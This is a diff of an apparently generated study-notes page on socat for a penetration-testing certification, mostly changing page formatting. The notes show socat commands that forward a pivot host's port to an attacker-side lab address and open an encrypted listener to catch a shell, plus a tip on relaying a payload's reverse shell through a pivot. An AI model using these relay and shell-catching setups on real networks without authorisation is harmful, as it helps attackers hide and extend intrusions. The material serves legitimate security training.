@@ -1,6 +1,9 @@
 ---
 title: "socat"
+description: "CPTS study notes, workflows, and references from the vault."
 ---
+
+{/* Generated from Tools/Quick Reference/socat.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
 A dumb bidirectional relay — no SSH, no auth. Great as a **redirector** on a pivot, or to catch/forward a shell through one.
 
@@ -13,4 +16,5 @@ socat TCP-LISTEN:8080,fork TCP:10.10.14.18:80
 socat -d -d OPENSSL-LISTEN:4443,cert=shell.pem,verify=0,fork STDOUT
 ```
 
-<Tip>Use socat when you can't run SSH on the pivot but can drop a binary. Point your payload's `LHOST` at the pivot; socat relays it to your real listener.</Tip>
+
+> Use socat when you can't run SSH on the pivot but can drop a binary. Point your payload's `LHOST` at the pivot; socat relays it to your real listener.
